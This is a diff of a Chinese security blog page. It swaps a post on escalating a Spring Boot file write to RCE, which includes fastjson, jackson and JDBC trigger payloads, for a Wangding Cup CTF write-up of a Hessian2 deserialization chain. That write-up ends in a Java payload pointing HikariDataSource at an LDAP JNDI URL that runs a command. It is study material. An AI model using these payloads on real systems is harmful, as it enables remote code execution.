@@ -24,7 +24,7 @@
 
   
 
-  <title>SpringBoot WriteFiles to RCE | CyanM0un</title>
+  <title>网鼎杯 hessian | CyanM0un</title>
 
   
 
@@ -47,7 +47,7 @@
 <!-- header container -->
 <header class="header-container post">
   
-    <div class="post-image" style="background-image: url(/images/swr.jpg)"></div>
+    <div class="post-image" style="background-image: url(/images/hessian.jpg)"></div>
   
 
   <!-- navbar -->
@@ -94,11 +94,11 @@
     <div class="header-content">
       <div class="post-text layout-block">
         <div class="layout-margin">
-          <h1 class="title-wrap">SpringBoot WriteFiles to RCE</h1>
+          <h1 class="title-wrap">网鼎杯 hessian</h1>
           <h2 class="title-sub-wrap">
             <strong>CyanM0un</strong>
             <span>发布于</span>
-            <time  class="article-date" datetime="2022-08-12T00:44:39.000Z" itemprop="datePublished">2022-08-12</time>
+            <time  class="article-date" datetime="2022-08-31T03:00:27.000Z" itemprop="datePublished">2022-08-31</time>
           </h2>
           <ul class="wrap-list dark">
   
@@ -129,63 +129,53 @@
       
       
       <section class="article-entry markdown-body layout-margin content-padding--large soft-size--large soft-style--box">
-        <h2 id="复现1"><a href="#复现1" class="headerlink" title="复现1"></a>复现1</h2><p>参考<a target="_blank" rel="noopener" href="https://landgrey.me/blog/22/%EF%BC%8C%E4%BB%85%E8%AE%B0%E5%BD%95%E4%B8%80%E4%BA%9B%E7%9F%A5%E8%AF%86%E7%82%B9">https://landgrey.me/blog/22/，仅记录一些知识点</a></p>
-<ul>
-<li>利用背景：<strong>一个正在运行中的 spring boot 项目如果存在本地任意写文件漏洞，怎么升级成 RCE 漏洞</strong></li>
-</ul>
-<blockquote>
-<p>现在生产环境部署 <code>spring boot</code> 项目一般都是将其打包成一个 <code>FatJar</code>，即把所有依赖的第三方 jar 也打包进自身的 <code>app.jar</code> 中，最后以 <code>java -jar app.jar</code> 形式来运行整个项目。</p>
-<p>运行时项目的 <code>classpath</code> 包括 <code>app.jar</code> 中的 <code>BOOT-INF/classes</code> 目录和 <code>BOOT-INF/lib</code> 目录下的所有 jar，因此无法在其运行的时候往 classpath 中增加文件。</p>
-</blockquote>
-<ul>
-<li>类装载和初始化</li>
-</ul>
-<p>java 程序运行的命令行加上参数 <code>-XX:+TraceClassLoading</code>，可以观察到类装载过程日志。</p>
-<p>当经过 <code>java.lang.Classloder.defineClass</code> 方法的时候，即<strong>读取字节码并定义Class类型</strong>后，类装载 <code>Loaded</code> 操作就算完成了。</p>
-<p>类初始化（也可以叫类实例化）一定发生在类装载之后，当调用类中的静态属性或者静态方法时，会<strong>被动触发</strong>类的初始化；调用 <code>new</code> 关键词、<code>newInstance</code> 方法、<code>Class.forName</code> 等方法时，会<strong>主动触发</strong>类的初始化。</p>
-<ul>
-<li>Up to RCE</li>
-</ul>
-<p>如果没办法写入文件到应用的 classpath 目录，可以写入文件到更底层的 **”系统的 classpath 目录”**，即 JDK HOME 目录下。</p>
-<blockquote>
-<p> jvm 为了避免一下加载太多暂时用不到或者以后都用不到的类，不会在一开始运行时把所有的 JDK HOME 目录下自带的 jar 文件全部加载到类中，存在 “<strong>懒加载</strong>“ 行为。主要特征就是相关 jar 文件的 <code>Opened</code> 操作没有在一开始就发生，而是调用到相关类时被触发。</p>
-</blockquote>
-<p>所以思路就是：替换 JDK HOME 目录下的系统 jar 文件（系统启动后未被<code>opened</code>），再主动触发 jar 文件里的类初始化来达到执行任意代码的方法。</p>
-<ul>
-<li><p>触发加载</p>
-<ul>
-<li>原生 Spring：对于每一次请求，spring 框架都会尝试解析 <code>Accept</code> 头的值，设置相应的字符集编码</li>
-</ul>
-<p>在<code>org.springframework.web.accept.HeaderContentNegotiationStrategy</code>中：</p>
-<p><img src="/SpringBoot-WriteFiles-to-RCE.assets/image-20220813092359998.png" alt="image-20220813092359998"></p>
-<p>最终走到：</p>
-<p><img src="/SpringBoot-WriteFiles-to-RCE.assets/image-20220813092641808.png" alt="image-20220813092641808"></p>
-<p><img src="/SpringBoot-WriteFiles-to-RCE.assets/image-20220813092755205.png" alt="image-20220813092755205"></p>
-<p>如果加了对应请求头，即会触发</p>
-<p><img src="/SpringBoot-WriteFiles-to-RCE.assets/image-20220813092836597.png" alt="image-20220813092836597"></p>
-<ul>
-<li><p>依赖库：</p>
-<ul>
-<li>fastjson1.2.76：</li>
-</ul>
-<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;x&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.nio.charset.Charset&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;val&quot;</span><span class="punctuation">:</span><span class="string">&quot;500&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+        <h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p><img src="/%E7%BD%91%E9%BC%8E%E6%9D%AF-hessian.assets/image-20220831110135430.png" alt="image-20220831110135430"></p>
+<p>还给了一个<code>MyBean</code>类（以及为了实现它的<code>toString</code>方法的两个其他类，不再多提）</p>
+<p><img src="/%E7%BD%91%E9%BC%8E%E6%9D%AF-hessian.assets/image-20220831110308109.png" alt="image-20220831110308109"></p>
+<p>熟悉 Rome 反序列化的就知道可以任意调用 getter 方法</p>
+<p>所以思路就是找 hessian 触发 toString 的链子</p>
+<p>可见：<a target="_blank" rel="noopener" href="https://paper.seebug.org/1814/#hessian2input">https://paper.seebug.org/1814/#hessian2input</a></p>
+<h2 id="hessian2toString"><a href="#hessian2toString" class="headerlink" title="hessian2toString"></a>hessian2toString</h2><p><img src="/%E7%BD%91%E9%BC%8E%E6%9D%AF-hessian.assets/image-20220831110650740.png" alt="image-20220831110650740"></p>
+<p>跟进 read() 函数</p>
+<p><img src="/%E7%BD%91%E9%BC%8E%E6%9D%AF-hessian.assets/image-20220831110735793.png" alt="image-20220831110735793"></p>
+<p>先进入 readBuffer() 后返回 <code>this._buffer[this._offset++] &amp; 255</code>（其实就是 this._bufferp[0] &amp; 255）</p>
+<p>如果我们能控制 tag 为 67</p>
+<p><img src="/%E7%BD%91%E9%BC%8E%E6%9D%AF-hessian.assets/image-20220831110952951.png" alt="image-20220831110952951"></p>
+<p><img src="/%E7%BD%91%E9%BC%8E%E6%9D%AF-hessian.assets/image-20220831111037135.png" alt="image-20220831111037135"></p>
+<p><img src="/%E7%BD%91%E9%BC%8E%E6%9D%AF-hessian.assets/image-20220831111110065.png" alt="image-20220831111110065"></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">readString</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">tag</span> <span class="operator">=</span> <span class="built_in">this</span>.read();</span><br><span class="line">    <span class="type">int</span> ch;</span><br><span class="line">    <span class="keyword">switch</span>(tag) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">...</span><br><span class="line">    <span class="keyword">case</span> <span class="number">31</span>:</span><br><span class="line">        <span class="built_in">this</span>._isLastChunk = <span class="literal">true</span>;</span><br><span class="line">        <span class="built_in">this</span>._chunkLength = tag - <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">this</span>._sbuf.setLength(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>((ch = <span class="built_in">this</span>.parseChar()) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">this</span>._sbuf.append((<span class="type">char</span>)ch);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>._sbuf.toString();</span><br><span class="line">    <span class="keyword">case</span> <span class="number">32</span>:</span><br><span class="line">    <span class="keyword">case</span> <span class="number">33</span>:</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">case</span> <span class="number">67</span>:</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">case</span> <span class="number">127</span>:</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">throw</span> <span class="built_in">this</span>.expect(<span class="string">&quot;string&quot;</span>, tag);</span><br><span class="line">    <span class="keyword">case</span> <span class="number">48</span>:</span><br><span class="line">    <span class="keyword">case</span> <span class="number">49</span>:</span><br><span class="line">    <span class="keyword">case</span> <span class="number">50</span>:</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">case</span> <span class="number">253</span>:</span><br><span class="line">    <span class="keyword">case</span> <span class="number">254</span>:</span><br><span class="line">    <span class="keyword">case</span> <span class="number">255</span>:</span><br><span class="line">        <span class="keyword">return</span> String.valueOf((tag - <span class="number">248</span> &lt;&lt; <span class="number">8</span>) + <span class="built_in">this</span>.read());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<ul>
-<li>jackson开启 enableDefaultTyping</li>
-</ul>
-<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">[</span><span class="string">&quot;sun.nio.cs.ext.IBM33722&quot;</span><span class="punctuation">,</span><span class="punctuation">&#123;</span><span class="attr">&quot;x&quot;</span><span class="punctuation">:</span><span class="string">&quot;y&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">]</span></span><br></pre></td></tr></table></figure>
+<p>那么根据上次的 read 函数，这里返回的就是 this._buffer[1] 了，如果能控制返回的是 32-127 就能进入 expect 函数，我们还控制为 67（后面会解释）</p>
+<p><img src="/%E7%BD%91%E9%BC%8E%E6%9D%AF-hessian.assets/image-20220831111453715.png" alt="image-20220831111453715"></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> IOException <span class="title function_">expect</span><span class="params">(String expect, <span class="type">int</span> ch)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="keyword">if</span> (ch &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.error(<span class="string">&quot;expected &quot;</span> + expect + <span class="string">&quot; at end of file&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        --<span class="built_in">this</span>._offset;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="built_in">this</span>.readObject();</span><br><span class="line">            <span class="keyword">return</span> obj != <span class="literal">null</span> ? <span class="built_in">this</span>.error(<span class="string">&quot;expected &quot;</span> + expect + <span class="string">&quot; at 0x&quot;</span> + Integer.toHexString(ch &amp; <span class="number">255</span>) + <span class="string">&quot; &quot;</span> + obj.getClass().getName() + <span class="string">&quot; (&quot;</span> + obj + <span class="string">&quot;)&quot;</span>) : <span class="built_in">this</span>.error(<span class="string">&quot;expected &quot;</span> + expect + <span class="string">&quot; at 0x&quot;</span> + Integer.toHexString(ch &amp; <span class="number">255</span>) + <span class="string">&quot; null&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException var4) &#123;</span><br><span class="line">            log.log(Level.FINE, var4.toString(), var4);</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>.error(<span class="string">&quot;expected &quot;</span> + expect + <span class="string">&quot; at 0x&quot;</span> + Integer.toHexString(ch &amp; <span class="number">255</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<ul>
-<li>jdbc url connection</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jdbc:mysql://127.0.0.1:3306/test?statementInterceptors=sun.nio.cs.ext.IBM33722</span><br></pre></td></tr></table></figure></li>
-</ul>
-</li>
-</ul>
-<p><img src="/SpringBoot-WriteFiles-to-RCE.assets/image-20220812090340229.png" alt="image-20220812090340229"></p>
-<h2 id="复现2"><a href="#复现2" class="headerlink" title="复现2"></a>复现2</h2><p>参考<a target="_blank" rel="noopener" href="https://www.cnblogs.com/wh4am1/p/14681335.html%E5%88%A9%E7%94%A8">https://www.cnblogs.com/wh4am1/p/14681335.html利用</a> SPI 机制</p>
-<p>初始化<code>java.lang.String(byte[],String)</code>的构造函数时会一步步到<code>lookupViaProviders</code>方法中，根据 SPI 慢慢写就好</p>
-<p><img src="/SpringBoot-WriteFiles-to-RCE.assets/image-20220813095747385.png" alt="image-20220813095747385"></p>
+<p>最终触发 toString</p>
+<h2 id="getConnection2JNDI"><a href="#getConnection2JNDI" class="headerlink" title="getConnection2JNDI"></a>getConnection2JNDI</h2><p><img src="/%E7%BD%91%E9%BC%8E%E6%9D%AF-hessian.assets/image-20220831112447279.png" alt="image-20220831112447279"></p>
+<p>跟进方法</p>
+<p><img src="/%E7%BD%91%E9%BC%8E%E6%9D%AF-hessian.assets/image-20220831112648624.png" alt="image-20220831112648624"></p>
+<p><img src="/%E7%BD%91%E9%BC%8E%E6%9D%AF-hessian.assets/image-20220831112842588.png" alt="image-20220831112842588"></p>
+<p>到 PoolBase</p>
+<p><img src="/%E7%BD%91%E9%BC%8E%E6%9D%AF-hessian.assets/image-20220831112934011.png" alt="image-20220831112934011"></p>
+<p>最终达到 JNDI</p>
+<p><img src="/%E7%BD%91%E9%BC%8E%E6%9D%AF-hessian.assets/image-20220831113039049.png" alt="image-20220831113039049"></p>
+<h2 id="solve"><a href="#solve" class="headerlink" title="solve"></a>solve</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.com.caucho.hessian.io.Hessian2Input;</span><br><span class="line"><span class="keyword">import</span> com.ctf.badbean.bean.MyBean;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">payload</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">HikariDataSource</span> <span class="variable">ds</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HikariDataSource</span>();</span><br><span class="line">        ds.setDataSourceJNDI(<span class="string">&quot;ldap://url:port/Basic/Command/calc&quot;</span>);</span><br><span class="line">        <span class="type">Hessian2Output</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Output</span>(byteArrayOutputStream);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyBean</span>(<span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, ds, HikariDataSource.class);</span><br><span class="line">        out.writeString(<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        out.writeObject(o);</span><br><span class="line">        out.flushBuffer();</span><br><span class="line">        System.out.println(Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray()));</span><br><span class="line">        <span class="type">Hessian2Input</span> <span class="variable">hessian2Input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Input</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>((byteArrayOutputStream.toByteArray())));</span><br><span class="line">        hessian2Input.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们重写了一个 HessianOutput 类来获得序列化数据，首先可以在 writeString 处对 this._buffer 赋值</p>
+<p><img src="/%E7%BD%91%E9%BC%8E%E6%9D%AF-hessian.assets/image-20220831114707839.png" alt="image-20220831114707839"></p>
+<p>第一个框中 buffer[offset++] &#x3D; 67 是为了 将 this._buffer[0] 赋值为67，后一句则将 this._buffer[1] 赋值为67，至于为什么等会再说</p>
+<p>第二个框是为了对于我们想构造的数据不要再产生多余影响了，正常数据还是原来处理</p>
+<p>然后跟入 writeObject 中</p>
+<p><img src="/%E7%BD%91%E9%BC%8E%E6%9D%AF-hessian.assets/image-20220831115142983.png" alt="image-20220831115142983"></p>
+<p>继续跟到</p>
+<p><img src="/%E7%BD%91%E9%BC%8E%E6%9D%AF-hessian.assets/image-20220831115210656.png" alt="image-20220831115210656"></p>
+<p>在这个函数中发现再次赋值为67</p>
+<p><img src="/%E7%BD%91%E9%BC%8E%E6%9D%AF-hessian.assets/image-20220831115315296.png" alt="image-20220831115315296"></p>
+<p>还记得之前 this._offset &#x3D; offset 吗，所以 this._buffer[1] &#x3D; 67</p>
+<p><img src="/%E7%BD%91%E9%BC%8E%E6%9D%AF-hessian.assets/image-20220831115459268.png" alt="image-20220831115459268"></p>
+<p>现在回想下那两个框，一切串起来后就会感觉构造的提别妙</p>
+<p><img src="/%E7%BD%91%E9%BC%8E%E6%9D%AF-hessian.assets/image-20220831115827449.png" alt="image-20220831115827449"></p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a target="_blank" rel="noopener" href="https://y4er.com/posts/wangdingbei-badbean-hessian2/">https://y4er.com/posts/wangdingbei-badbean-hessian2/</a></p>
+<p><a target="_blank" rel="noopener" href="http://miku233.viewofthai.link/2022/08/29/2022%E7%BD%91%E9%BC%8E%E6%9D%AFJava/">http://miku233.viewofthai.link/2022/08/29/2022%E7%BD%91%E9%BC%8E%E6%9D%AFJava/</a></p>
 
       </section>
 
@@ -193,32 +183,16 @@
       
         <nav class="article-nav">
           
-            <div class="article-nav-item layout-padding">
-  <article class="card-container article-nav-card content-padding--primary soft-size--large soft-style--box">
-    
-      <div class="card-cover" background-image-lazy data-img="/images/bw.jpg"></div>
-    
-    <div class="card-text">
-      
-        <a href="/2022/08/15/Bypass-Waf/" itemprop="url">
-          <h2 class="card-text--title text-ellipsis">Bypass Waf</h2>
-        </a>
-      
-      <div class="card-text--row">Newer</div>
-    </div>
-  </article>
-</div>
-          
           
             <div class="article-nav-item layout-padding">
   <article class="card-container article-nav-card content-padding--primary soft-size--large soft-style--box">
     
-      <div class="card-cover" background-image-lazy data-img="/images/ma.jpeg"></div>
+      <div class="card-cover" background-image-lazy data-img="/images/c3p0.jpeg"></div>
     
     <div class="card-text">
       
-        <a href="/2022/08/01/MemShell-Attack/" itemprop="url">
-          <h2 class="card-text--title text-ellipsis">MemShell-Attack</h2>
+        <a href="/2022/08/18/Unser-C3P0/" itemprop="url">
+          <h2 class="card-text--title text-ellipsis">Unser C3P0</h2>
         </a>
       
       <div class="card-text--row">Older</div>
@@ -287,7 +261,7 @@
     <span>TOC</span>
   </div>
   <div class="widget-body">
-    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%8D%E7%8E%B01"><span class="toc-number">1.</span> <span class="toc-text">复现1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%8D%E7%8E%B02"><span class="toc-number">2.</span> <span class="toc-text">复现2</span></a></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90"><span class="toc-number">1.</span> <span class="toc-text">题目分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#hessian2toString"><span class="toc-number">2.</span> <span class="toc-text">hessian2toString</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#getConnection2JNDI"><span class="toc-number">3.</span> <span class="toc-text">getConnection2JNDI</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#solve"><span class="toc-number">4.</span> <span class="toc-text">solve</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">5.</span> <span class="toc-text">参考</span></a></li></ol>
   </div>
 </section>
 
